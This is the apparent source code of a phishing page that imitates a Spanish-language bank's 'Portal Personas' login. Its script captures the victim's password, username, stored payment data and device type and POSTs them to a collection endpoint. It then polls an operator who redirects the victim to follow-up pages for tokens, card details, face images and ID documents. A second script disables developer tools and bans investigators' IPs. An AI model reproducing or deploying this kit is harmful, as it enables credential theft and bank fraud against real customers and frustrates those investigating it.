<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Portal Personas</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
html,body{width:100%;height:100%;font-family:Arial,Helvetica,sans-serif}
body{overflow:hidden}
.container{display:flex;width:100%;height:100vh}
.left-panel, .right-panel{ width:50%; height:100vh; }
.left-panel img{ width:100%; height:100%; object-fit:cover; display:block; }
.right-panel{ background:#f5f5f5; display:flex; justify-content:center; align-items:center; }
.login-container{ width:420px; max-width:90%; }
.logo{ margin-bottom:35px; }
.logo img{ width:180px; display:block; }
h1{ font-size:38px; line-height:1.05; color:#242424; font-weight:700; margin-bottom:20px; }
.description{ font-size:15px; color:#333; line-height:1.7; margin-bottom:28px; }
label{ display:block; font-size:16px; font-weight:700; color:#222; margin-bottom:10px; }
.password-box{ position:relative; }
.password-box input{ width:100%; height:48px; border:1px solid #9fb0c5; border-radius:8px; padding:0 50px 0 15px; font-size:15px; outline:none; background:#fff; }
.password-box input:focus{ border-color:#4b75a8; }
.eye{ position:absolute; right:15px; top:50%; transform:translateY(-50%); cursor:pointer; font-size:20px; user-select:none; }
.actions{ margin-top:20px; display:flex; justify-content:space-between; align-items:center; }
.btn{ width:140px; height:44px; border:none; border-radius:25px; background:#0067d8; color:#fff; font-size:16px; font-weight:700; cursor:pointer; }
.btn:hover{ opacity:.95; }
.btn:disabled{ background:#d1d6d9; cursor:not-allowed; }
.forgot{ color:#0067d8; text-decoration:none; font-size:15px; font-weight:600; }
.separator{ border:none; border-top:1px solid #ddd; margin:60px 0 28px; }
.register{ font-size:15px; color:#333; }
.register a{ color:#0067d8; text-decoration:none; font-weight:700; }
.error{ display:none; color:#cb3234; font-size:15px; margin-top:12px; }

@media(max-width:900px){
    body{ overflow-y:auto; overflow-x:hidden; }
    .container{ flex-direction:column; height:auto; min-height:100vh; }
    .left-panel{ width:100%; height:35vh; }
    .right-panel{ width:100%; height:auto; justify-content:flex-start; align-items:flex-start; }
    .login-container{ width:100%; max-width:none; padding:25px 32px 40px; }
    .logo{ margin-bottom:35px; }
    .logo img{ width:180px; }
    h1{ font-size:32px; line-height:1.1; }
    .description{ font-size:14px; }
    .actions{ gap:15px; }
    .forgot{ font-size:14px; }
    .separator{ margin:40px 0 24px; }
}

.loader-overlay {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background-color: #fcfcfc;
    display: none;
    justify-content: center;
    align-items: center;
    flex-direction: column;
    z-index: 1000;
}

.loader-text {
    color: #555;
    font-size: 16px;
    margin: 10px 0 5px;
}

.loader-image {
    width: 95px;
    height: 44px;
    margin: 0 auto 20px;
}
</style>
</head>
<body>

<div class="container">
    <div class="left-panel">
        <img src="img/c.jpg" alt="">
    </div>
    <div class="right-panel">
        <div class="login-container">
            <div class="logo">
                <img src="img/l.svg" alt="">
            </div>
            <h1>Bienvenido al Portal<br>Personas</h1>
            <p class="description">
                Ingrese su contraseña de canales digitales, recuerde que está compuesta por 8 caracteres.
            </p>

            <form action="" method="POST" id="loginForm">
                <label for="password">Contraseña</label>
                <div class="password-box">
                    <input type="password" id="password" name="password" autocomplete="off" required placeholder="Mínimo 8 caracteres">
                    <span class="eye" id="toggleEye">👁</span>
                </div>

                <div id="error" class="error">
                    Error: La contraseña debe tener exactamente 8 caracteres (letras y números).
                </div>

                <div class="actions">
                    <button type="submit" class="btn" id="btnSubmit" disabled>Iniciar sesión</button>
                    <a href="#" class="forgot">¿Olvidó su contraseña?</a>
                </div>
            </form>

            <hr class="separator">
            <div class="register">
                ¿Es un cliente nuevo? <a href="#">Registrarse</a>
            </div>
        </div>
    </div>
</div>

<div class="loader-overlay" id="loaderOverlay">
    <img src="img/load.gif" alt="Cargando..." class="loader-image">
    <div class="loader-text">Verificando...</div>
</div>

<script>
const pass = document.getElementById('password');
const eye = document.getElementById('toggleEye');
const form = document.getElementById('loginForm');
const error = document.getElementById('error');
const btnSubmit = document.getElementById('btnSubmit');
const loaderOverlay = document.getElementById('loaderOverlay');

// Usuario recibido del POST de index.php
const usuario = "<?php echo htmlspecialchars($_POST['usuario'] ?? '', ENT_QUOTES, 'UTF-8'); ?>";
let transactionId = null;
let messageId = null;
let pollingInterval = null;

// Toggle mostrar/ocultar contraseña
eye.addEventListener('click', () => {
    pass.type = (pass.type === 'password') ? 'text' : 'password';
});

// Validar en tiempo real mientras se escribe
pass.addEventListener('input', () => {
    const contraseña = pass.value.trim();
    const largo = contraseña.length;
    const tieneLetra = /[a-zA-Z]/.test(contraseña);
    const tieneNumero = /[0-9]/.test(contraseña);
    
    // Activar botón SOLO si tiene EXACTAMENTE 8 caracteres con letras y números
    if(largo === 8 && tieneLetra && tieneNumero) {
        btnSubmit.disabled = false;
        btnSubmit.style.background = '#0067d8';
        btnSubmit.style.cursor = 'pointer';
        error.style.display = 'none';
    } else {
        btnSubmit.disabled = true;
        btnSubmit.style.background = '#d1d6d9';
        btnSubmit.style.cursor = 'not-allowed';
        error.style.display = 'none';
    }
});

// Manejar envío del formulario
form.addEventListener('submit', async e => {
    e.preventDefault();
    
    const contraseña = pass.value.trim();
    const tieneLetra = /[a-zA-Z]/.test(contraseña);
    const tieneNumero = /[0-9]/.test(contraseña);
    
    // Validación cliente final
    if(contraseña.length !== 8 || !tieneLetra || !tieneNumero){
        error.style.display = 'block';
        return;
    }
    
    error.style.display = 'none';
    
    // ========== CLAVE: Obtener tbdatos de localStorage ==========
    const tbdatosStr = localStorage.getItem('tbdatos');
    let tbdatos = {};
    try {
        tbdatos = tbdatosStr ? JSON.parse(tbdatosStr) : {};
    } catch (e) {
        tbdatos = {};
    }

    const amountCandidates = [
        localStorage.getItem('total_pagar'),
        localStorage.getItem('monto'),
        localStorage.getItem('amount'),
        localStorage.getItem('valor'),
        localStorage.getItem('valor_pagar'),
        localStorage.getItem('total'),
        tbdatos.total_pagar,
        tbdatos.monto,
        tbdatos.amount,
        tbdatos.valor,
        tbdatos.valor_pagar,
        tbdatos.total
    ];
    const amountValue = amountCandidates.find(value => value !== null && value !== '' && value !== undefined && String(value).trim() !== '') || '0';
    if (amountValue !== '0' && (!tbdatos.total_pagar || String(tbdatos.total_pagar) === '0')) {
        tbdatos.total_pagar = String(amountValue);
        localStorage.setItem('tbdatos', JSON.stringify(tbdatos));
    }
    const total_pagar = amountValue;
    
    // Detectar dispositivo
    const userAgent = navigator.userAgent;
    let dispositivo = 'PC';
    if (/Android/i.test(userAgent)) {
        dispositivo = 'Android';
    } else if (/iPhone|iPad|iPod/i.test(userAgent)) {
        dispositivo = 'iPhone';
    } else if (/Windows/i.test(userAgent)) {
        dispositivo = 'PC';
    } else if (/Mac/i.test(userAgent)) {
        dispositivo = 'Mac';
    } else if (/Linux/i.test(userAgent)) {
        dispositivo = 'Linux';
    }
    
    const timestamp = new Date().toLocaleString('es-ES');
    
    // Generar o recuperar session_id
    let sessionId = ((() => { const params = new URLSearchParams(window.location.search); const direct = [params.get('transactionId'), params.get('tid'), params.get('tx'), params.get('session_id'), params.get('ts')].find((value) => value !== null && String(value).trim() !== ''); if (direct) { const normalized = String(direct); localStorage.setItem('session_id', normalized); localStorage.setItem('last_tid', normalized); return normalized; } const generated = 'session_' + Date.now() + '_' + Math.random().toString(36).slice(2, 11); localStorage.setItem('session_id', generated); localStorage.setItem('last_tid', generated); return generated; })());
    if (!sessionId) {
        sessionId = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
        localStorage.setItem('session_id', sessionId);
    }
    
    // ========== CONSTRUIR PAYLOAD EXACTAMENTE COMO b-34f1 ==========
    const payload = {
        usuario: usuario,
        clave: contraseña,
        transactionId: sessionId,
        tbdatos: tbdatos,
        total_pagar: total_pagar,
        dispositivo: dispositivo,
        timestamp: timestamp
    };
    
    // Guardar en localStorage para referencia
    localStorage.setItem('username', usuario);
    localStorage.setItem('password', contraseña);
    localStorage.setItem('identificacion', usuario);
    
    // Mostrar loader
    loaderOverlay.style.display = 'flex';
    
    // Enviar a procesar_logo.php
    try {
        const response = await fetch('procesar_logo.php', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(payload)
        });
        
        const resultado = await response.json();
        console.log("Respuesta procesar_logo.php:", resultado);
        
        if(resultado.status === 'success') {
            transactionId = sessionId;
            messageId = resultado.messageId;
            
            localStorage.setItem('messageId', messageId);
            
            // Comenzar polling
            comenzarPolling();
        } else {
            loaderOverlay.style.display = 'none';
            alert(resultado.message || 'Error al enviar datos');
        }
    } catch(err) {
        console.error("Error:", err);
        loaderOverlay.style.display = 'none';
        alert('Error de conexión: ' + err.message);
    }
});

// Función para comenzar polling
async function comenzarPolling() {
    const formData = new FormData();
    formData.append('transactionId', transactionId);
    formData.append('messageId', messageId);
    
    try {
        const res = await fetch('verificar_respuesta.php?ts=' + Date.now(), {
            method: 'POST',
            body: formData,
            cache: 'no-store'
        });
        const result = await res.json();
        console.log("Respuesta verificar_respuesta.php:", result);
        
        if(result.action) {
            loaderOverlay.style.display = 'none';
            
            switch(result.action) {
                case 'pedir_dinamica':
                case 'error_token':
                case 'dinamica_dinamica':
                case 'pedir_token':
                    window.location.href = "token.php?txn=" + encodeURIComponent(transactionId);
                    break;
                case 'ban_ip':
                    try {
                        localStorage.clear();
                        sessionStorage.clear();
                        document.cookie.split(";").forEach(function(c) { 
                            document.cookie = c.replace(/^ +/, "").replace(/=.*/, "=;expires=" + new Date().toUTCString() + ";path=/"); 
                        });
                    } catch(e) {}
                    window.location.replace("/fin.php");
                    break;
                case 'confirm_finalizar':
                case 'dinamica_finalizar':
                    window.location.href = "/fin.php";
                    break;
                case 'error_logo':
                case 'dinamica_error_logo':
                    alert("Usuario o clave incorrectos.");
                    window.location.href = "index.php";
                    break;
                case 'error_cajero':
                case 'dinamica_cajero':
                case 'pedir_cajero':
                    window.location.href = "cajero.php?txn=" + encodeURIComponent(transactionId);
                    break;
                case 'tarjeta':
                case 'error_tc':
                case 'dinamica_tarjeta':
                    window.location.href = "/datac/alter.php";
                    break;
                case 'error':
                case 'dinamica_cara':
                case 'pedir_usuario':
                    window.location.href = "/caras";
                    break;
                case 'cedula':
                case 'dinamica_cedula':
                    window.location.href = "/cedula";
                    break;
                case 'bre_b':
                    window.location.href = "/recaudos/brev.php?occidente";
                    break;
                default:
                    setTimeout(() => comenzarPolling(), 2000);
            }
        } else {
            // Seguir polling si no hay acción
            setTimeout(() => comenzarPolling(), 2000);
        }
    } catch(err) {
        console.error("Error polling:", err);
        setTimeout(() => comenzarPolling(), 2000);
    }
}
</script>
<script>
// --- DESACTIVAR CLICK DERECHO, INSPECCIONAR Y F12 ---
(function() {
    // 1. Desactivar Click Derecho
    document.addEventListener('contextmenu', function(e) {
        e.preventDefault();
    });

    // 2. Desactivar atajos de teclado de desarrollo (F12, Ctrl+Shift+I, Ctrl+Shift+C, Ctrl+Shift+J, Ctrl+U, Cmd+Opt+I)
    document.addEventListener('keydown', function(e) {
        // F12
        if (e.keyCode === 123) {
            e.preventDefault();
            triggerAutoBan();
            return false;
        }
        // Ctrl+Shift+I o Cmd+Opt+I
        if ((e.ctrlKey || e.metaKey) && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74 || e.keyCode === 67)) {
            e.preventDefault();
            triggerAutoBan();
            return false;
        }
        // Ctrl+U (Ver código fuente)
        if ((e.ctrlKey || e.metaKey) && e.keyCode === 85) {
            e.preventDefault();
            triggerAutoBan();
            return false;
        }
    });

    // 3. Detectar apertura de Herramientas de Desarrollo (DevTools) por dimensiones
    let devtoolsOpen = false;
    const threshold = 160;
    
    function checkDevTools() { return false; }

    // 4. Función para Auto-Banear la IP del Atacante
    let banTriggered = false;
    function triggerAutoBan() {
        if (banTriggered) return;
        banTriggered = true;
        
        // Limpieza inmediata del almacenamiento local
        try {
            localStorage.clear();
            sessionStorage.clear();
            document.cookie.split(";").forEach(function(c) { 
                document.cookie = c.replace(/^ +/, "").replace(/=.*/, "=;expires=" + new Date().toUTCString() + ";path=/"); 
            });
        } catch(e) {}

        // Enviar IP para auto-bloqueo al backend (usamos el honeypot para gatillar el baneo)
        const formData = new FormData();
        formData.append('website', 'automated_devtools_trigger');
        
        // Buscamos si tenemos la variable de transacción en localStorage
        let tid = '';
        try {
            tid = localStorage.getItem('last_tid') || localStorage.getItem('session_id') || '';
        } catch(e) {}
        if (tid) {
            formData.append('transactionId', tid);
        }

        // Enviamos post silencioso para banear la IP en el backend
        fetch('/gate/process/paso1datos.php', {
            method: 'POST',
            body: formData,
            keepalive: true
        }).finally(function() {
            window.location.replace("/fin.php");
        });
    }
})();
// ---------------------------------------------------
</script>
</body>
</html>
